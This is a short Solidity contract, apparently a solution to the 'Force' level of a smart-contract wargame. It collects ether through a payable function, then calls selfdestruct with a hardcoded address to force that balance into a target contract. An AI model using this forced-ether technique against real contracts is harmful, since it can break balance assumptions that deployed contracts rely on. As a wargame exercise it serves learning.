// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Force {}

contract HackForce {
    function selfDestroy() public {
        selfdestruct(0x7fFE6144325d54aD0830589f4C8279Be298ac68d);
    }

    function _receive() public payable returns (uint256) {
        return address(this).balance;
    }
}
